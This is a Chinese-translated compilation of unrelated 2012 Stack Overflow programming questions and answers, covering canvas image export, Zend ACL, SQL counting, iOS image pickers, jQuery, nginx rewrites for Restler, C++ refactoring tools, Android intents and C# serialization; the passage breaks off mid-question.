**异步**您的代码在发送消息/调用函数后继续执行，您通常将引用传递给在答案到达时执行的回调函数（可能在一小时，几天，几年内发生），同时您的主线程继续.

# image - 带有图像的画布到 jpeg

> ID：10102582
> 
> 赞同：0
> 
> 时间：2012-04-11T08:39:28.823
> 
> 标签：image, canvas, jpeg

我想在画布上获得一个 .jpg，添加一个矩形和一个字符串，效果很好。之后，我想从画布中创建一个 jpg，效果很好，但画布的 jpg 确实只显示了矩形和字符串。快速代码示例 - 我知道它是一个丑陋的画布 - 只是测试;）

```
<!DOCTYPE html>
<html>
<body>
<canvas id="meinCanvas" width="600" height="600" style="border:1px solid #c3c3c3;">
Your browser does not support the canvas element.
</canvas>
</body>

<script type="text/javascript">
var canv = document.getElementById("meinCanvas");
var context = canv.getContext("2d");
context.fillStyle = "#000000";
context.fillRect(10,10, 200, 100);
var img = new Image();
img.onload = function() {
context.drawImage(img, 300, 300);
};
img.src="one.jpg";
context.font = "bold 12px sans-serif";
context.fillText("test", 500, 500);
imgsr = canv.toDataURL("image/jpeg");
document.write('<img src="' +imgsr +'"/>');
</script>
</html>
} 
```

在上部（画布）中正确显示了 img，但在其下方的 .jpeg 中未显示 img。帮助会很棒。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:15:06.813

保存时图像尚未加载。

将 toDataUrl 放入 img.onload 或将其链接到事件或计时器

# zend-framework - 无法创建第一个 ACL 示例

> ID：10102585
> 
> 赞同：0
> 
> 时间：2012-04-11T08:39:40.817
> 
> 标签：zend-framework, acl

我想将我的 ACL 插件加载到应用程序中，然后开始使用 ACL

我按照本[教程](http://codeutopia.net/blog/2009/02/06/zend_acl-part-1-misconceptions-and-simple-acls/)开始学习 ACL。

我这样做

```
 class My_ACL extends Zend_Acl {

public function __construct() {

    $this->addRole(new Zend_Acl_Role('member'));
    $this->addRole(new Zend_Acl_Role('admin'));

    //discussions is a module name
    $this->add(new Zend_Acl_Resource('discussions'));

    //privileges is a module name
    $this->add(new Zend_Acl_Resource('privileges'));

     //default is a the default mdule
    $this->add(new Zend_Acl_Resource('default'));

    //allow admin every thing
    $this->allow('admin');
   //tmp just for testing
      $this->allow('member');

} 
```

在插件中我删除了所有东西，只保留一个回显语句

```
 class Application_Plugin_Acl extends Zend_Controller_Plugin_Abstract {

private $_acl = null;

public function __construct() {
    $this->_acl = new My_ACL();
}

public function preDispatch(Zend_Controller_Request_Abstract $request) {

    $role = (Zend_Auth::getInstance()->hasIdentity()) ? 'admin' : 'member';

echo $this->_acl->isAllowed($role, $request->getModuleName() . ':' . $request->getControllerName() . ':' . $request->getActionName());

} 
```

但是当我尝试访问系统的任何 url 时，会发生此错误

```
 Fatal error: Uncaught exception 'Zend_Acl_Exception' with message 'Resource 'default:error:error' not found' in    

  D:\ZendFramework\library\Zend\Controller\Plugin\Broker.php on line 312
  ( ! ) Zend_Acl_Exception: Resource 'default:error:error' not found in                         D:\ZendFramework\library\Zend\Acl.php on line 365 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:01:04.570

添加这一行

```
if($request->getControllerName() == 'error')  return ; 
```

后

```
 $role = (Zend_Auth::getInstance()->hasIdentity()) ? 'admin' : 'member'; 
```

基本上每当发生应用程序错误时，ZF 都会将请求对象更改为模块默认值、错误控制器及其错误操作。对于这种情况，您还没有创建任何资源。按照我所说的，您将能够看到“应用程序错误”页面，这将帮助您解决第一个问题。

# asp.net - 如何使用 json 将 byte[] 参数传递给 wcf 数据服务

> ID：10102588
> 
> 赞同：0
> 
> 时间：2012-04-11T08:40:00.350
> 
> 标签：asp.net, json, wcf-data-services

我有一个数据服务。使用 Json 如何将`byte[]`参数传递给数据服务中的方法之一？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T17:38:34.500

根据[http://www.odata.org/developers/protocols/json-format](http://www.odata.org/developers/protocols/json-format)，JSON 使用 EDM 类型的文字形式。EDM 类型是 Edm.Binary，文字形式为 binary'...'

# sql - 如何计算 Indivisual 客户下的订单？

> ID：10102591
> 
> 赞同：0
> 
> 时间：2012-04-11T08:40:13.810
> 
> 标签：sql, sql-server, sql-server-2008, window-functions

我有桌子

```
Order(orderid, customerid, billingcompanyname, billingfirstname,
 billinglastname, billingcountry, shipcountry, paymentamount, 
 creditcardtransactionid, orderdate, creditcardauthorizationdate, orderstatus, 
 total_payment_received, tax1_title salestax1) 
```

**customerid**是外键。

我需要计算单个客户下的订单，其中包含公司名称，尤其是输出中的所有字段。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:44:33.537

尝试这个：

```
SELECT o1.cnt, o2.*
FROM (
    SELECT COUNT(*) cnt, customerid FROM order GROUP BY customerid
) o1
INNER JOIN order o2 on o1.customerid = o2.customerid 
```

甚至更好：

```
SELECT order.*, COUNT(*) OVER (PARTITION BY customerid) AS cnt
FROM order 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:45:01.213

要获得这样的结果，您必须，`GROUP BY`但`customerid`不能`orderid`在结果集中，因为`COUNT`必须在 的不同值上运行`orderid`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T09:38:54.107

您在订单表上有 companyName 字段吗？您应该在订单表上有一个公司表和一个 companyId。

无论如何，在这种情况下（如果客户总是属于同一家公司），您可以简单地执行以下操作：

```
select customerid, billingcompanyname, count(*)
from orders
group by customerid, billingcompanyname 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-16T05:13:21.520

**用这个。**

```
with customers as (select '1424' id_customer, '13-Feb-15' date_purchase, 'Petr' name_first, 'Kellner' name_last, 'Chicago' name_city from dual
union all
select '1425' id_customer, '13-Feb-15' date_purchase, 'Shelley' name_first, 'Birdwick' name_last, 'San Jose' name_city from dual
union all
select '1426' id_customer, '13-Feb-15' date_purchase, 'Morris' name_first, 'Moore' name_last, 'San Fransisco' name_city from dual
union all
select '1427' id_customer, '13-Feb-15' date_purchase, 'Shyam' name_first, 'Bajaj' name_last, 'Detroit' name_city from dual
union all
select '1428' id_customer, '13-Feb-15' date_purchase, 'Xu' name_first, 'Wang' name_last, 'New York' name_city from dual),

orders as (select '1224215' id_order, '1425' id_customer, '13-Feb-15' date_purchase, '235' amount_product, 'Name of Book' name_product from dual
union all
select '1224216' id_order, '1424' id_customer, '13-Feb-15' date_purchase, '356' amount_product, 'Name of Book' name_product from dual
union all
select '1224217' id_order, '1426' id_customer, '13-Feb-15' date_purchase, '263' amount_product, 'Name of Book' name_product from dual
union all
select '1224218' id_order, '1426' id_customer, '13-Feb-15' date_purchase, '326' amount_product, 'Name of Book' name_product from dual
union all
select '1224219' id_order, '1427' id_customer, '13-Feb-15' date_purchase, '236' amount_product, 'Name of Book' name_product from dual
union all
select '1224220' id_order, '1428' id_customer, '13-Feb-15' date_purchase, '233' amount_product, 'Name of Book' name_product from dual
union all
select '1224221' id_order, '1426' id_customer, '13-Feb-15' date_purchase, '633' amount_product, 'Name of Book' name_product from dual
union all
select '1224222' id_order, '1424' id_customer, '13-Feb-15' date_purchase, '235' amount_product, 'Name of Book' name_product from dual
union all
select '1224215' id_order, '1426' id_customer, '13-Feb-15' date_purchase, '632' amount_product, 'Name of Book' name_product from dual
union all
select '1224215' id_order, '1425' id_customer, '13-Feb-15' date_purchase, '236' amount_product, 'Name of Book' name_product from dual)

select customers.name_first, customers.name_last, count(distinct id_order) orders, sum(amount_product) total_amount
from customers left join orders on customers.id_customer = orders.id_customer group by customers.name_first, customers.name_last; 
```

# iphone - 在 AGImagePickerController 中确定选定的照片

> ID：10102593
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:40:20.527
> 
> 标签：iphone, ios, xcode

我正在使用`AGImagePickerController`. 我很难弄清楚如何将选择的图像导入到`iCarousel`另一个轮播中。我知道其中`success block`包含所选图像。我似乎无法将其导入我的`awakeFromNib`或将其放入数组中。

这是我调用 AGImagePickerController 的代码：

```
 -(IBAction) cameraRoll {AGImagePickerController *imagePickerController = [[AGImagePickerController alloc] initWithFailureBlock:^(NSError *error) {

        if (error == nil)
        {
            NSLog(@"User has cancelled.");
            [self dismissModalViewControllerAnimated:YES];
        } else
        {     
            NSLog(@"Error: %@", error);

            // Wait for the view controller to show first and hide it after that
            double delayInSeconds = 0.5;
            dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
            dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
                [self dismissModalViewControllerAnimated:YES];
            });
        }

        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault animated:YES];

    } andSuccessBlock:^(NSArray *info) {
        NSLog(@"Info: %@", info);
        [self dismissModalViewControllerAnimated:YES];

        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault animated:YES];
    }];

    [self presentModalViewController:imagePickerController animated:YES];
    [imagePickerController release];
} 
```

在我的 awakeFromNib 中：

```
- (void)awakeFromNib
{    
    if (self) {

        self.images = [NSMutableArray arrayWithObjects:@"111.jpg",
                       @"112.jpg",
                       @"113.jpg",
                       @"114.jpg",
                       @"115.jpg",
                       @"116.jpg",
                       @"117.jpg",
                       @"118.png",
                       @"119.jpg",
                       @"120.jpg",
                       nil];

    }
} 
```

然后我为我的轮播实现这个：

```
- (UIView *)carousel:(iCarousel *)carousel viewForItemAtIndex:(NSUInteger)index
{
    //create a numbered view
    UIView *view = [[UIImageView alloc] initWithImage:[UIImage imageNamed:[images objectAtIndex:index]]];
    return view;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-26T16:01:22.487

您应该能够查看`info array`using NSLog 语句的内容。查看该日志语句的内容会很有帮助。

我在[这里](http://pastebin.com/B2bX2i1r)找到了它，它可能会起作用：

```
for (i = 0; i < info.count; i++) {
     ALAssetRepresentation *rep = [[info objectAtIndex: i] defaultRepresentation];
     UIImage * image  = [UIImage imageWithCGImage:[rep fullResolutionImage]];
} 
```

**编辑**：

在用户选择图像后，您需要保存图像（在内存中或通过将它们写入文件）。如果要将它们写入文件，可以这样做：

```
[UIImageJPEGRepresentation(image, 1.0) writeToFile:jpgPath atomically:YES]; 
```

如果 AGImagePickerController 代码在您的`iCarousel`类中，您只需将图像添加到您的`images`数组中。你`successBlock`会看起来像这样：

```
self.images = [NSMutableArray new];

for (i = 0; i < info.count; i++) {
     ALAssetRepresentation *rep = [[info objectAtIndex: i] defaultRepresentation];
     UIImage * image  = [UIImage imageWithCGImage:[rep fullResolutionImage]];
     [self.images addObject:image];
} 
```

最后，在您的 iCarousel 代码中，您需要从图像数组或磁盘中读取图像（取决于您选择保存它们的位置）。如果您将它们保存在内存中，您的代码可能如下所示：

```
- (UIView *)carousel:(iCarousel *)carousel viewForItemAtIndex:(NSUInteger)index
{
    return [[UIImageView alloc] initWithImage:[self.images objectAtIndex:index]];
} 
```

或者，如果您决定将图像保存到磁盘，那么您可以使用`[UIImage imageWithContentsOfFile:filePath];`.

# jquery - jquery如何遍历属性值列表

> ID：10102605
> 
> 赞同：0
> 
> 时间：2012-04-11T08:40:54.107
> 
> 标签：jquery, jquery-selectors, custom-data-attribute

我有这个方法：

```
$("#btnupdateofficeapprovers").click(function () {
        var checkedInvoiceLineIds = $(":checked").attr("data-invoicelineid");

        checkedInvoiceLineIds.each(function (index) {
            alert(index + ': ' + $(this).text());
        });
    });

<table>
        @foreach (var item in Model.Invoice.InvoiceLines) {
            <tr class="subheader">
                <td>
                    <input type="checkbox" class="invoicelinecombobox" data-invoicelineid=@item.InvoiceLineId >
                </td>
            </tr>

        }
    </table>

<div id="updateapproversdiv">
    @Html.DropDownListFor(modelItem => Model.Invoice.ApprovedForPaymentUserId, Model.OfficeApprovers, new { @class = "officeapproverddl" })
    <input type="button" id="btnupdateofficeapprovers" class="button invisibleforprint" value="Update" />
</div> 
```

我想要做的是获取所有的 invoicelineid 并将它们放在一个集合中。

接下来，我想遍历列表中的每个 id 并将其显示在警报中。

问题是这引发了一个很大的异常。有谁知道如何解决？这个怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:52:24.323

您可以简单地使用 jQuery 选择器“具有属性”：[http ://api.jquery.com/has-attribute-selector/](http://api.jquery.com/has-attribute-selector/)

jsfiddle：http: [//jsfiddle.net/NF5Ss/1/](http://jsfiddle.net/NF5Ss/1/)

```
$("#btnupdateofficeapprovers").click(function () {
    var checkedInvoiceLineIds = $(":checked[data-invoicelineid]");

    console.log(checkedInvoiceLineIds);

    checkedInvoiceLineIds.each(function(index) {
       alert(index + ': ' + $(this).data('invoicelineid'));
    });
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:46:14.060

`attr()`返回一个字符串。你不能用`each()`. 这可能是你想要做的：

```
$("#btnupdateofficeapprovers").click(function () {
    var ids = $("input:checked").attr("data-invoicelineid").split(' ');
    $.each(ids, function(i, v) {
        alert(i + ': ' + v);
    });
}); 
```

**编辑：**你也可以像**@Armatus**建议的那样做：

```
$("#btnupdateofficeapprovers").click(function () {
    var $els = $("input:checked");
    $els.each(function(i){
        alert(i + ': ' + $(this).attr('data-invoicelineid'));
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:48:05.120

.each 遍历一个 jquery 对象。您将 checkedInvoiceLineIds 分配给 .attr() ，它是一个字符串并且没有 .each

使其 =$(':checked') 然后在 .each 中访问其 .attr。

# c# - 如何在 ASPX 中重定向到当前页面的同级或子文件夹页面

> ID：10102607
> 
> 赞同：0
> 
> 时间：2012-04-11T08:40:57.493
> 
> 标签：c#, asp.net, url

用户接受后，我需要将 PayPal 服务重定向到页面。我要重定向的页面遵循以下结构：

*   我的.aspx
*   \Paypal\Accept.aspx
*   \Paypal\Cancel.aspx
*   \Paypal\Finish.aspx

所以如果我在`http://localhost:63000/myfolder/me.aspx`

我想被 PayPal 重定向到`http://localhost:63000/myfolder/paypal/accept.aspx`

如何？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:48:52.267

`ReturnURL = HttpContext.Current.Request.Url.AbsoluteUri.ToLower().Replace("me", "PayPal/Accept")`

如果 HttpContext.Current.Request.Url.AbsoluteUri 为[http://localhost:63000/myfolder/me.aspx](http://localhost:63000/myfolder/me.aspx)则 ReturnURL 为[http://localhost:63000/myfolder/PayPal/Accept.aspx](http://localhost:63000/myfolder/PayPal/Accept.aspx)，并且 PayPal 沙箱正确返回。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T08:14:38.920

行。得到它的工作！

我可以使用 HttpContext.Current 来获取我当前的 Url，然后将当前页面重写到子目录和页面：

`ReturnURL = HttpContext.Current.Request.Url.AbsoluteUri.ToLower().Replace("me", "PayPal/Accept")`

如果 HttpContext.Current.Request.Url.AbsoluteUri 是，`http://localhost:63000/myfolder/me.aspx`则 ReturnURL 是`http://localhost:63000/myfolder/PayPal/Accept.aspx`，并且 PayPal 沙箱正确返回。

# c++ - C++ 重构：条件扩展和块消除

> ID：10102610
> 
> 赞同：5
> 
> 时间：2012-04-11T08:41:08.963
> 
> 标签：c++, refactoring, automated-refactoring

我正在重构大量代码，主要是 C++，以删除一些已永久设置为给定值的临时配置检查。因此，例如，我将有以下代码：

```
#include <value1.h>
#include <value2.h>
#include <value3.h>

...

if ( value1() )
{
    // do something
}

bool b = value2();

if ( b && anotherCondition )
{
    // do more stuff
}

if ( value3() < 10 )
{
    // more stuff again
} 
```

其中对 value 的调用返回 bool 或 int。因为我知道这些调用总是返回的值，所以我做了一些正则表达式替换来将调用扩展到它们的正常值：

```
// where:
//   value1() == true
//   value2() == false
//   value3() == 4

// TODO: Remove expanded config (value1)
if ( true )
{
    // do something
}

// TODO: Remove expanded config (value2)
bool b = false;

if ( b && anotherCondition )
{
    // do more stuff
}

// TODO: Remove expanded config (value3)
if ( 4 < 10 )
{
    // more stuff again
} 
```

请注意，虽然这些值是固定的，但它们不是在编译时设置的，而是从共享内存中读取的，因此编译器当前没有在幕后优化任何东西。

虽然生成的代码看起来有点傻，但这种正则表达式方法实现了我想要的很多东西，因为它应用简单并且消除了对调用的依赖，同时不会改变代码的行为，而且编译器也可能会优化一个很多事情都知道永远不会调用一个块，否则检查将始终返回 true。它还可以相当容易地（尤其是在针对版本控制进行差异化时）查看发生了什么变化并采取最后的清理步骤，因此上面的代码最终如下所示：

```
// do something

// DONT do more stuff (b being false always prevented this)

// more stuff again 
```

问题是我要从第二个正确但愚蠢的阶段进行数百次（可能数千次）更改才能获得最终的清理代码。

我想知道是否有人知道可以处理此问题的重构工具或我可以应用的任何技术。主要问题是 C++ 语法使得完全扩展或消除很难实现，并且上面的代码有很多排列。我觉得我几乎需要一个编译器来处理我需要涵盖的语法变化。

我知道有类似的问题，但我找不到任何类似的要求，并且想知道在被问到之后是否出现了任何工具或程序？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-02T10:07:49.907

听起来你有我所说的“僵尸代码”......在实践中已经死了，但就编译器而言仍然存在。对于大多数有组织的运行时配置变量的系统来说，这是一个非常常见的问题：最终，一些配置变量会达到永久固定状态，但会在运行时反复重新评估。

正如您所指出的，解决方法不是正则表达式，因为正则表达式不能可靠地解析 C++ 代码。你需要的是一个[程序转换系统](http://en.wikipedia.org/wiki/Program_transformation)。这是一个*真正*解析源代码的工具，可以将一组代码到代码的重写规则应用到解析树上，并且可以从改变的树中重新生成源文本。

我知道 Clang 在这里有一些能力；它可以解析 C++ 并构建树，但它没有源到源的转换能力。您可以通过编写 AST 到 AST 转换来模拟该功能，但恕我直言，这更不方便。我相信它可以重新生成 C++ 代码，但我不知道它是否会保留注释或预处理器指令。

我们的[DMS Software Reengineering Toolkit](http://www.semanticdesigns.com/Products/DMS/DMSToolkit.html)及其[C++(11) 前端](http://www.semanticdesigns.com/Products/FrontEnds/CppFrontEnd.html)可以（并且已用于）对 C++ 源代码进行大量转换，并且具有源到源的转换。AFAIK，它是唯一可以做到这一点的生产工具。您需要的是一组转换，这些转换代表您对感兴趣的配置变量的最终状态的了解，以及一些简单的代码简化规则。以下 DMS 规则与您可能想要的很接近：

```
 rule fix_value1():expression->expression
    "value1()" -> "true";
  rule fix_value2():expression->expression
    "value2()" -> "false";
  rule fix_value3():expression->expression
    "value3()" -> "4";

  rule simplify_boolean_and_true(r:relation):condition->condition
     "r && true" -> "r".
  rule simplify_boolean_or_ture(r:relation):condition->condition
     "r || true" -> "true".
  rule simplify_boolean_and_false(r:relation):condition->condition
     "r && false" -> "false".
  ...
  rule simplify_boolean_not_true(r:relation):condition->condition
     "!true" -> "false".
  ...

  rule simplify_if_then_false(s:statement): statement->statement
      " if (false) \s" -> ";";
  rule simplify_if_then_true(s:statement): statement->statement
      " if (true) \s" -> "\s";
  rule simplify_if_then_else_false(s1:statement, s2:statement): statement->statement
      " if (false) \s1 else \s2" -> "\s2";
  rule simplify_if_then_else_true(s1:statement, s2: statement): statement->statement
      " if (true) \s1 else \s2" -> "\s2"; 
```

您还需要规则来简化（“折叠”）涉及算术的常量表达式，以及处理**打开**现在为常量的表达式的规则。要查看整数常量折叠的 DMS 规则是什么样的，请参阅[作为 DMS 域的代数](http://www.semdesigns.com/products/DMS/SimpleDMSDomainExample.html)。

与正则表达式不同，DMS 重写规则不能“不匹配”代码；它们代表相应的 AST，并且匹配的是 AST。因为它是 AST 匹配，所以它们没有空格、换行或注释的问题。您可能认为他们可能在操作数的顺序上遇到问题（'如果遇到“false && x”怎么办？'）；他们没有，因为**&&**和**||的语法规则** 在 DMS C++ 解析器中被标记为关联和交换，并且匹配过程会自动将其考虑在内。

这些规则本身不能做的是跨赋值的值（在你的情况下是常量）传播。为此，您需要进行流分析，以便您可以跟踪此类分配（“到达定义”）。显然，如果您没有这样的任务或很少，您可以手动修补这些任务。如果这样做，您将需要流量分析；唉，DMS 的 C++ 前端并不完全在那里，但我们正在努力；我们有控制流分析。（DMS的C前端有全流分析）。

（编辑 2015 年 2 月：现在执行完整的 C++14；函数/方法内的流分析）。

实际上，我们在大约十年前将这项技术应用于 IBM Tivoli 的 1.5M SLOC 混合 C 和 C++ 代码应用程序，并取得了巨大成功；我们不需要流量分析：-}

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:26:18.707

你说：

> 请注意，尽管这些值是合理固定的，但它们不是在编译时设置的，而是从共享内存中读取的，因此编译器当前没有在幕后优化任何东西。

*除非它们完全*固定，否则手动不断折叠值没有多大意义。如果您的编译器提供[constexpr](http://www.cprogramming.com/c++11/c++11-compile-time-processing-with-constexpr.html)您可以使用它，或者您可以像这样替换预处理器宏：

```
#define value1() true
#define value2() false
#define value3() 4 
```

优化器会从那里照顾你。在没有看到`<valueX.h>`标题中确切内容的示例或不知道从共享内存中获取这些值的过程是如何工作的情况下，我只会抛出重命名现有 valueX() 函数并进行运行时检查以防万一他们在未来再次改变：

```
// call this at startup to make sure our agreed on values haven't changed
void check_values() {
    assert(value1() == get_value1_from_shared_memory());
    assert(value2() == get_value2_from_shared_memory());
    assert(value3() == get_value3_from_shared_memory());
} 
```

# matlab - 情节延长数年

> ID：10102613
> 
> 赞同：0
> 
> 时间：2012-04-11T08:41:14.963
> 
> 标签：matlab, plot

在以下示例中，我有两年的数据，用 data_2007 和 data_2008 表示，它们有一个相应的日期数组：

```
clear all
DateTime_2007 = datestr(datenum('2007-01-01 00:00','yyyy-mm-dd HH:MM'):1/24:...
    datenum('2007-12-31 23:57','yyyy-mm-dd HH:MM'),...
    'yyyy-mm-dd HH:MM');
DateTime_2007 = cellstr(DateTime_2007);

DateTime_2008 = datestr(datenum('2008-01-01 00:00','yyyy-mm-dd HH:MM'):1/24:...
    datenum('2008-12-31 23:57','yyyy-mm-dd HH:MM'),...
    'yyyy-mm-dd HH:MM');
DateTime_2008 = cellstr(DateTime_2008);

data_2007 =  1 + (20-1).*rand(8760,1);
data_2008 = 1 + (20-1).*rand(8784,1); 
```

我想将数据绘制在一张图表上，显示数据在 2 年内的变化情况，所以基本上是一个超过 2 年的图表。考虑到我需要沿 x 轴显示日期，并且可能只给出月份名称 (mmm)（不是 yyyy-mm-dd HH:MM），如何实现这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:08:03.903

使用[日期记号](http://www.mathworks.co.uk/help/techdoc/ref/datetick.html)。您的日期应该只是 datenum：

```
DateTime_2008 = datenum('2008-01-01 00:00','yyyy-mm-dd HH:MM'):1/24:...
datenum('2008-12-31 23:57','yyyy-mm-dd HH:MM'); 
```

你可以像这样绘制它：

```
plot([DateTime_2007 DateTime_2008], [data_2007; data_2008]);
datetick('x'); 
```

如果您想要不同的刻度格式，请尝试：

```
datetick('x', 'yyyy-mm'); 
```

如果您想自己选择刻度的位置（要实际指定刻度，您可能需要使用`set(gca, 'XTick', ...)`，请参阅[轴属性](http://www.mathworks.co.uk/help/techdoc/ref/axes_props.html)）：

```
datetick('x', 'keepticks'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:09:00.907

您是否尝试过`datetick`标记轴的命令？

```
plot(datenum(DateTime_2007),data_2007)
hold on
plot(datenum(DateTime_2008),data_2008,'g')
datetick('x','mmm') 
```

如果您没有将日期转换为日期字符串，则可能会更容易，然后必须将它们转换回来进行绘图。

# php - 我不能让 Restler 工作

> ID：10102616
> 
> 赞同：0
> 
> 时间：2012-04-11T08:41:27.400
> 
> 标签：php, rest, nginx

我一直在尝试使用[Restler](http://luracast.com/products/restler/) php api。

我的网络服务器根目录中有一个 api.php 文件：

```
<?php
require_once('lib/restler.php');

class Say {
    function hello($to='world') {
        return "Hello $to!";
    }
}

$r = new Restler();
$r->addAPIClass('Say');
$r->handle();
?> 
```

我尝试使用最简单的示例 GET api.php/say/hello，但 nginx 一直以错误 404 响应我。在日志中我看到“不是目录”。

我想这是我的 nginx conf 的问题，但找不到任何关于它的具体信息。任何的想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-14T12:45:04.753

解决我的问题：

我将代码放入 /api/index.php

然后修改我的nginx配置添加：

```
location /api {
        if (!-f $request_filename) {
            rewrite ^(.*)$ /api/index.php last;
        }

        if (!-d $request_filename) {
            rewrite ^(.*)$ /api/index.php last;
        }
    } 
```

所以现在如果我调用 GET /api/say/hello，它会重定向到 /api/index.php/say/hello 并且重写规则允许 restler 发挥它的魔力。

我希望这将有助于 nginx 上 restler 的未来用户。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:43:43.810

查看[rewrite 模块](http://wiki.nginx.org/HttpRewriteModule)以了解如何使 nginx 接受`api.php/say/hello`URL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-22T14:28:09.830

根据 nginx 文档（IfIsEvil [http://wiki.nginx.org/IfIsEvil](http://wiki.nginx.org/IfIsEvil)），经过事先考虑，即使解决方案有效，您也应该能够在没有 if 的情况下执行此操作，如下所示：

```
location /api {
    try_files $uri /api/index.php;

    #if (!-f $request_filename) {
    #    rewrite ^(.*)$ /api/index.php last;
    #}

    #if (!-d $request_filename) {
    #    rewrite ^(.*)$ /api/index.php last;
    #}
} 
```

希望这对其他人有帮助。

# android - 从被调用的活动中传回价值

> ID：10102617
> 
> 赞同：2
> 
> 时间：2012-04-11T08:41:30.673
> 
> 标签：android

我是 android 编程新手，有以下问题。

我有一个调用另一个活动（屏幕）的活动（屏幕）。我可以通过创建一个 intext 并使用 putExtras 从 Activity2 传回值。然后，当我返回我的主要活动 1 时，我可以 (onActivityResult) 从返回的意图中检索字符串值对。

问题 1 如果 Activity2 完成，如果垃圾收集器启动，我在那里创建的 Intent 有什么可能被释放？或者在退出应用程序之前，android不会清除任何这样的内存。

问题 2）如果我然后回到 Activity2 并再次执行“新 Intent .....”，是否会分配更多内存，如果是这样，是否效率低下？

问题 3 - 有没有更好的方法将数据从被调用活动传递回调用活动，或者使用 Intent 和 putExtras 等唯一方法？

谢谢托尼

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T11:50:05.280

在您要发送数据的班级中-

```
Intent intent = new Intent(context,NextClass.class); 
intent.putExtra("ACTIVITY_ID","Any value or variable" );
intent.putExtra("CUSTOMER_ID","Any Value or variable" );
startActivityForResult(intent, 0); 
```

现在在接收类，让我们说 NextClass

```
Bundle extras=getIntent().getExtras();
String ACTIVITY_ID=extras.getString("ACTIVITY_ID");
String CUSTOMER_ID=extras.getString("CUSTOMER_ID"); 
```

通过使用这种方法，我们可以轻松地将数据从一个活动传递到另一个活动......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T11:07:31.460

我的建议是。

如果您有已使用各种活动的数据，那么请改为使用 Intent 从 1 个活动传递数据到另一个活动。创建全局级别静态变量，然后通过应用程序访问该全局变量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:53:01.750

How much data are you going to pass between activities? Bytes, Kilobytes or Megabytes?

If its only bytes or some kilobytes then this is my answer:

1.  don't worry about the garbage collector.It will do its job
2.  yes more memory will be allocated. no it is not inefficient
3.  Intent and putExtras is the preferred way.

If the data is really large and you can save it to sd card and pass a file uri between activities.

# jax-ws - JAX-WS 从列表中删除空值

> ID：10102618
> 
> 赞同：0
> 
> 时间：2012-04-11T08:41:36.370
> 
> 标签：jax-ws

我有包含此方法的网络服务 [JAX-WS]：

```
 @WebMethod
    public List<String> getNumber() {
         List<String> s = new ArrayList<String>();
         s.add("test1");
         s.add("test2");
         s.add(null);
         return s; 
     } 
```

另外，我有 webservice 客户端调用上面的 webservice。但是当获取列表时，列表的大小为 2。我如何将空值从 web 服务传递给客户端？

# c# - 如何序列化自定义 EventHandler

> ID：10102619
> 
> 赞同：1
> 
> 时间：2012-04-11T08:41:38.587
> 
> 标签：c#, events, xml-serialization

早上好，

我有一个带有自定义事件的类 DirObserver：

```
public EventHandler<FileDetectedEventArgs> NewFileDetected; 
```

我尝试在另一个类中序列化这个类：

```
private XmlSerializer serializer = new XmlSerializer(typeof(List<DirObserver>)); 
```

但我得到一个例外： *FileDetectedEventArgs 无法序列化，因为它没有无参数构造函数。*

但是 FileDetectedEventArgs-Class 有一个无参数的构造函数：

```
public class FileDetectedEventArgs : EventArgs
{
    public String Source { get; set; }
    public String Destination { get; set; }
    public String FullName { get; set; }

    public FileDetectedEventArgs(String source, String destination, String fullName)
    {
        this.Source = source;
        this.Destination = destination;
        this.FullName = fullName;
    }

    public FileDetectedEventArgs() { }
} 
```

然而，将引发异常。这里有什么问题？

感谢并问候托马斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:04:27.530

改变

```
public EventHandler<FileDetectedEventArgs> NewFileDetected; 
```

到

```
public event EventHandler<FileDetectedEventArgs> NewFileDetected; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:11:21.793

事件处理程序不会被序列化。如果您查看异常的内部异常，您会发现它是 EventHandler 类，它没有无参数构造函数；它是一个代表。

您可能希望从序列化中排除事件处理程序；添加一个 XmlIgnore 属性。

更新

我错过了@Reniuz 提到的缺失*事件关键字。*序列化适用于该更正。尽管如此，我认为通常序列化事件处理程序是一个坏主意。

# ruby-on-rails-3 - 带有方法的 assert_routing 给出错误而不是失败

> ID：10102621
> 
> 赞同：0
> 
> 时间：2012-04-11T08:41:52.960
> 
> 标签：ruby-on-rails-3, routes, functional-testing, assertions

在我的 rails 3.2.3 应用程序中，我有一个主题控制器，它被建模为资源。我想编写一个功能测试来验证 /topics 上的帖子是有效路线。这应该首先失败，然后我将添加代码来修复它。但是，我在路由测试中遇到错误，而不是失败。我在做什么错？（注意：如果我在 routes.rb 中修复路由，测试通过 - 只是不确定为什么我在测试中收到错误而不是失败）：

`# topics_controller_test.rb`

```
test 'route exists to create topic' do
